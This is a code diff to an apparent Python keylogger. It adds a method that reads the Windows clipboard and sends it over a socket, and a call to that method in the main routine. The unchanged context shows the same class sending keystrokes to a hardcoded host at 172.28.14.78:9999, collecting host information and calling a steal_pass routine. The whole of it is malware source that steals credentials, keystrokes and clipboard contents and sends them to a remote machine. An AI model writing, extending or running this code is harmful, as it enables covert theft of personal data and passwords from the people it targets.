@@ -6,6 +6,7 @@ import requests
 import json
 import psutil
 import platform
+import win32clipboard
 
 class Keylogger:
     def __init__(self, ip, port):
@@ -36,6 +37,12 @@ class Keylogger:
             for i in key:
                 self.client.send(str(i).encode('utf-8'))
 
+    def clipboard_data(self):
+        win32clipboard.OpenClipboard()
+        cp_p = win32clipboard.GetClipboardData()
+        win32clipboard.CloseClipboard()
+        self.send_data(cp_p)
+    
     def host_info(self):
         name = socket.gethostname()
         priv_ip = socket.gethostbyname(name)
@@ -127,5 +134,6 @@ if __name__ == "__main__":
     ke = Keylogger("172.28.14.78", 9999)
     ke.start_socket()
     ke.host_info()
+    ke.clipboard_data()
     ke.steal_pass()
     ke.keylogger()
